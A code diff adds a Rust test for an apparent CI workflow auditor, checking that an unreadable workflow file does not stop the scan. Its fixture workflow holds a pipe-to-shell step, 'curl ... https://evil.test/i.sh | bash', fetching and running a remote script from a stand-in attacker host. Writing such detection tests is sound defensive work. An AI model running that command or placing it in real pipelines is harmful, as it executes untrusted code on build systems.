@@ -316,6 +316,37 @@ fn multiple_workflow_files() {
     assert_eq!(findings.len(), 1);
 }
 
+#[test]
+fn audit_skips_unreadable_workflow_and_continues() {
+    // A non-UTF-8 (or otherwise unreadable) workflow must not abort the scan of
+    // the others — one bad file shouldn't take down a CI gate.
+    let dir = tempfile::TempDir::new().unwrap();
+    let wf = dir.path().join(".github").join("workflows");
+    std::fs::create_dir_all(&wf).unwrap();
+    // Sorts first; invalid UTF-8 bytes make read_to_string error.
+    std::fs::write(wf.join("aaa-bad.yml"), [0xff, 0xfe, 0x00, 0x9f]).unwrap();
+    // Sorts later; a real pipe-to-shell finding.
+    std::fs::write(
+        wf.join("zzz-good.yml"),
+        "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -fsSL https://evil.test/i.sh | bash\n",
+    )
+    .unwrap();
+
+    let output = common::pinprick_cmd()
+        .arg("audit")
+        .arg(dir.path())
+        .output()
+        .unwrap();
+
+    // Exit 1 (found the good file's finding), not 2 (aborted on the bad file).
+    assert_eq!(
+        output.status.code(),
+        Some(1),
+        "stderr: {}",
+        String::from_utf8_lossy(&output.stderr)
+    );
+}
+
 // ── Missing workflows directory ─────────────────────────────────────────────
 
 #[test]
